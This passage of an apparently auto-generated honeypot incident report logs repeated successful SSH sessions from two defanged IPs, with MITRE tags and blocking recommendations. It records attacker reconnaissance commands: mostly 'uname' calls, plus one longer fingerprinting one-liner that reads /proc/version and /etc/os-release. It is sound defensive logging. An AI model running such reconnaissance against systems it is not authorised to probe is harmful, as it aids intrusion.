| `2026-07-21 04:08:57` | `cowrie.client.kex` |
| `2026-07-21 04:08:57` | `cowrie.login.success` |
| `2026-07-21 04:08:58` | `cowrie.session.params` |
| `2026-07-21 04:08:58` | `cowrie.command.input` |
| `2026-07-21 04:08:58` | `cowrie.log.closed` |
| `2026-07-21 04:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff91f8ceb279

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:02` | `cowrie.session.connect` |
| `2026-07-21 04:09:02` | `cowrie.client.version` |
| `2026-07-21 04:09:02` | `cowrie.client.kex` |
| `2026-07-21 04:09:02` | `cowrie.login.success` |
| `2026-07-21 04:09:03` | `cowrie.session.params` |
| `2026-07-21 04:09:03` | `cowrie.command.input` |
| `2026-07-21 04:09:03` | `cowrie.log.closed` |
| `2026-07-21 04:09:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29b585fb1e81

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:07` | `cowrie.session.connect` |
| `2026-07-21 04:09:07` | `cowrie.client.version` |
| `2026-07-21 04:09:07` | `cowrie.client.kex` |
| `2026-07-21 04:09:07` | `cowrie.login.success` |
| `2026-07-21 04:09:08` | `cowrie.session.params` |
| `2026-07-21 04:09:08` | `cowrie.command.input` |
| `2026-07-21 04:09:08` | `cowrie.log.closed` |
| `2026-07-21 04:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58e7558813ac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:12` | `cowrie.session.connect` |
| `2026-07-21 04:09:12` | `cowrie.client.version` |
| `2026-07-21 04:09:12` | `cowrie.client.kex` |
| `2026-07-21 04:09:12` | `cowrie.login.success` |
| `2026-07-21 04:09:13` | `cowrie.session.params` |
| `2026-07-21 04:09:13` | `cowrie.command.input` |
| `2026-07-21 04:09:13` | `cowrie.log.closed` |
| `2026-07-21 04:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6abdf7c8c7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:17` | `cowrie.session.connect` |
| `2026-07-21 04:09:17` | `cowrie.client.version` |
| `2026-07-21 04:09:17` | `cowrie.client.kex` |
| `2026-07-21 04:09:17` | `cowrie.login.success` |
| `2026-07-21 04:09:18` | `cowrie.session.params` |
| `2026-07-21 04:09:18` | `cowrie.command.input` |
| `2026-07-21 04:09:18` | `cowrie.log.closed` |
| `2026-07-21 04:09:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e0af8362969

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:22` | `cowrie.session.connect` |
| `2026-07-21 04:09:22` | `cowrie.client.version` |
| `2026-07-21 04:09:22` | `cowrie.client.kex` |
| `2026-07-21 04:09:22` | `cowrie.login.success` |
| `2026-07-21 04:09:23` | `cowrie.session.params` |
| `2026-07-21 04:09:23` | `cowrie.command.input` |
| `2026-07-21 04:09:23` | `cowrie.log.closed` |
| `2026-07-21 04:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a96584e5eecd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:26` | `cowrie.session.connect` |
| `2026-07-21 04:09:27` | `cowrie.client.version` |
| `2026-07-21 04:09:27` | `cowrie.client.kex` |
| `2026-07-21 04:09:27` | `cowrie.login.success` |
| `2026-07-21 04:09:28` | `cowrie.session.params` |
| `2026-07-21 04:09:28` | `cowrie.command.input` |
| `2026-07-21 04:09:28` | `cowrie.log.closed` |
| `2026-07-21 04:09:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20ef41d0220b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:31` | `cowrie.session.connect` |
| `2026-07-21 04:09:32` | `cowrie.client.version` |
| `2026-07-21 04:09:32` | `cowrie.client.kex` |
| `2026-07-21 04:09:33` | `cowrie.login.success` |
| `2026-07-21 04:09:33` | `cowrie.session.params` |
| `2026-07-21 04:09:33` | `cowrie.command.input` |
| `2026-07-21 04:09:33` | `cowrie.log.closed` |
| `2026-07-21 04:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5263238d083b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:37` | `cowrie.session.connect` |
| `2026-07-21 04:09:37` | `cowrie.client.version` |
| `2026-07-21 04:09:37` | `cowrie.client.kex` |
| `2026-07-21 04:09:37` | `cowrie.login.success` |
| `2026-07-21 04:09:38` | `cowrie.session.params` |
| `2026-07-21 04:09:38` | `cowrie.command.input` |
| `2026-07-21 04:09:38` | `cowrie.log.closed` |
| `2026-07-21 04:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0af71b8028

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:42` | `cowrie.session.connect` |
| `2026-07-21 04:09:42` | `cowrie.client.version` |
| `2026-07-21 04:09:42` | `cowrie.client.kex` |
| `2026-07-21 04:09:42` | `cowrie.login.success` |
| `2026-07-21 04:09:43` | `cowrie.session.params` |
| `2026-07-21 04:09:43` | `cowrie.command.input` |
| `2026-07-21 04:09:43` | `cowrie.log.closed` |
| `2026-07-21 04:09:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ede002dd842

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:47` | `cowrie.session.connect` |
| `2026-07-21 04:09:47` | `cowrie.client.version` |
| `2026-07-21 04:09:47` | `cowrie.client.kex` |
| `2026-07-21 04:09:47` | `cowrie.login.success` |
| `2026-07-21 04:09:48` | `cowrie.session.params` |
| `2026-07-21 04:09:48` | `cowrie.command.input` |
| `2026-07-21 04:09:48` | `cowrie.log.closed` |
| `2026-07-21 04:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4117c22ee816

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:52` | `cowrie.session.connect` |
| `2026-07-21 04:09:52` | `cowrie.client.version` |
| `2026-07-21 04:09:52` | `cowrie.client.kex` |
| `2026-07-21 04:09:53` | `cowrie.login.success` |
| `2026-07-21 04:09:53` | `cowrie.session.params` |
| `2026-07-21 04:09:53` | `cowrie.command.input` |
| `2026-07-21 04:09:54` | `cowrie.log.closed` |
| `2026-07-21 04:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156af2e416df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:09 |
| **Last Seen** | 2026-07-21 04:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:09:58` | `cowrie.session.connect` |
| `2026-07-21 04:09:58` | `cowrie.client.version` |
| `2026-07-21 04:09:58` | `cowrie.client.kex` |
| `2026-07-21 04:09:58` | `cowrie.login.success` |
| `2026-07-21 04:09:59` | `cowrie.session.params` |
| `2026-07-21 04:09:59` | `cowrie.command.input` |
| `2026-07-21 04:09:59` | `cowrie.log.closed` |
| `2026-07-21 04:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70aa6db7d2f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:03` | `cowrie.session.connect` |
| `2026-07-21 04:10:03` | `cowrie.client.version` |
| `2026-07-21 04:10:03` | `cowrie.client.kex` |
| `2026-07-21 04:10:03` | `cowrie.login.success` |
| `2026-07-21 04:10:04` | `cowrie.session.params` |
| `2026-07-21 04:10:04` | `cowrie.command.input` |
| `2026-07-21 04:10:04` | `cowrie.log.closed` |
| `2026-07-21 04:10:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e57ec8660b7b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:06` | `cowrie.session.connect` |
| `2026-07-21 04:10:07` | `cowrie.client.version` |
| `2026-07-21 04:10:07` | `cowrie.client.kex` |
| `2026-07-21 04:10:09` | `cowrie.login.success` |
| `2026-07-21 04:10:11` | `cowrie.session.params` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.success` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:11` | `cowrie.command.input` |
| `2026-07-21 04:10:12` | `cowrie.log.closed` |
| `2026-07-21 04:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7a9b5b3267c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:08` | `cowrie.session.connect` |
| `2026-07-21 04:10:08` | `cowrie.client.version` |
| `2026-07-21 04:10:08` | `cowrie.client.kex` |
| `2026-07-21 04:10:08` | `cowrie.login.success` |
| `2026-07-21 04:10:09` | `cowrie.session.params` |
| `2026-07-21 04:10:09` | `cowrie.command.input` |
| `2026-07-21 04:10:09` | `cowrie.log.closed` |
| `2026-07-21 04:10:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-158ca354621b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:13` | `cowrie.session.connect` |
| `2026-07-21 04:10:13` | `cowrie.client.version` |
| `2026-07-21 04:10:13` | `cowrie.client.kex` |
| `2026-07-21 04:10:13` | `cowrie.login.success` |
| `2026-07-21 04:10:14` | `cowrie.session.params` |
| `2026-07-21 04:10:14` | `cowrie.command.input` |
| `2026-07-21 04:10:14` | `cowrie.log.closed` |
| `2026-07-21 04:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f2c5aa8f33

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:18` | `cowrie.session.connect` |
| `2026-07-21 04:10:18` | `cowrie.client.version` |
| `2026-07-21 04:10:18` | `cowrie.client.kex` |
| `2026-07-21 04:10:19` | `cowrie.login.success` |
| `2026-07-21 04:10:20` | `cowrie.session.params` |
| `2026-07-21 04:10:20` | `cowrie.command.input` |
| `2026-07-21 04:10:20` | `cowrie.log.closed` |
| `2026-07-21 04:10:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23cc0a28fba7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:23` | `cowrie.session.connect` |
| `2026-07-21 04:10:23` | `cowrie.client.version` |
| `2026-07-21 04:10:23` | `cowrie.client.kex` |
| `2026-07-21 04:10:23` | `cowrie.login.success` |
| `2026-07-21 04:10:24` | `cowrie.session.params` |
| `2026-07-21 04:10:24` | `cowrie.command.input` |
| `2026-07-21 04:10:24` | `cowrie.log.closed` |
| `2026-07-21 04:10:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c96f55593e66

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:28` | `cowrie.session.connect` |
| `2026-07-21 04:10:28` | `cowrie.client.version` |
| `2026-07-21 04:10:28` | `cowrie.client.kex` |
| `2026-07-21 04:10:28` | `cowrie.login.success` |
| `2026-07-21 04:10:29` | `cowrie.session.params` |
| `2026-07-21 04:10:29` | `cowrie.command.input` |
| `2026-07-21 04:10:29` | `cowrie.log.closed` |
| `2026-07-21 04:10:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fab14e1b1b3f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:33` | `cowrie.session.connect` |
| `2026-07-21 04:10:33` | `cowrie.client.version` |
| `2026-07-21 04:10:33` | `cowrie.client.kex` |
| `2026-07-21 04:10:34` | `cowrie.login.success` |
| `2026-07-21 04:10:35` | `cowrie.session.params` |
| `2026-07-21 04:10:35` | `cowrie.command.input` |
| `2026-07-21 04:10:35` | `cowrie.log.closed` |
| `2026-07-21 04:10:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a0b16aeb9a7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:38` | `cowrie.session.connect` |
| `2026-07-21 04:10:38` | `cowrie.client.version` |
| `2026-07-21 04:10:38` | `cowrie.client.kex` |
| `2026-07-21 04:10:39` | `cowrie.login.success` |
| `2026-07-21 04:10:40` | `cowrie.session.params` |
| `2026-07-21 04:10:40` | `cowrie.command.input` |
| `2026-07-21 04:10:40` | `cowrie.log.closed` |
| `2026-07-21 04:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ee513e3abf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:43` | `cowrie.session.connect` |
| `2026-07-21 04:10:43` | `cowrie.client.version` |
| `2026-07-21 04:10:43` | `cowrie.client.kex` |
| `2026-07-21 04:10:44` | `cowrie.login.success` |
| `2026-07-21 04:10:45` | `cowrie.session.params` |
| `2026-07-21 04:10:45` | `cowrie.command.input` |
| `2026-07-21 04:10:45` | `cowrie.log.closed` |
| `2026-07-21 04:10:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d559097cf29

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:48` | `cowrie.session.connect` |
| `2026-07-21 04:10:48` | `cowrie.client.version` |
| `2026-07-21 04:10:48` | `cowrie.client.kex` |
| `2026-07-21 04:10:49` | `cowrie.login.success` |
| `2026-07-21 04:10:50` | `cowrie.session.params` |
| `2026-07-21 04:10:50` | `cowrie.command.input` |
| `2026-07-21 04:10:50` | `cowrie.log.closed` |
| `2026-07-21 04:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06887d191541

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:53` | `cowrie.session.connect` |
| `2026-07-21 04:10:53` | `cowrie.client.version` |
| `2026-07-21 04:10:53` | `cowrie.client.kex` |
| `2026-07-21 04:10:54` | `cowrie.login.success` |
| `2026-07-21 04:10:55` | `cowrie.session.params` |
| `2026-07-21 04:10:55` | `cowrie.command.input` |
| `2026-07-21 04:10:55` | `cowrie.log.closed` |
| `2026-07-21 04:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f5927141723

| Field | Detail |
